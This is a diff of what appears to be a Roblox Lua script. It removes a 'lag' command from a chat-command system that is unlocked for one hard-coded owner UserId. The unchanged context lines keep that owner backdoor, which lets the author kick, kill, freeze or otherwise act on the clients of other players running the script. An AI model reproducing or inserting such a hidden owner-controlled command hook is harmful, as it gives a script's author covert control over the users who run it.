@@ -801,7 +801,7 @@ if game.Players.LocalPlayer.UserId == 458422705 then
                 FactName.ZIndex = 9
                 FactName.AnchorPoint = Vector2.new(0.5, 0.5)
                 FactName.Font = Enum.Font.GothamSemibold
-                FactName.Text = "Hello Owner! Prefix : / Commands {explode , bring , crash , lag , died , kick , shutdown , freeze}"
+                FactName.Text = "Hello Owner! Prefix : / Commands {explode , bring , died , kick , shutdown , freeze}"
                 FactName.RichText = true
                 FactName.TextWrapped = true
                 FactName.TextColor3 = themeList.TextColor
@@ -1142,9 +1142,6 @@ end
 function Kick()
 game.Players.LocalPlayer:Kick("lol")
 end
-function Lag()
-game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
-end
 function Died()
 game.Players.LocalPlayer.Character.Humanoid.Health = Died
 end
@@ -1196,9 +1193,6 @@ message = string.lower(Message)
 			end
 			if cmd[2] == "unfreeze" and TargetPlayer == game.Players.LocalPlayer.Name then
 			UnFreeze()
-			end
-			if cmd[2] == "lag" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Lag()
 			end
 			if cmd[2] == "died" and TargetPlayer == game.Players.LocalPlayer.Name then
 			Died()
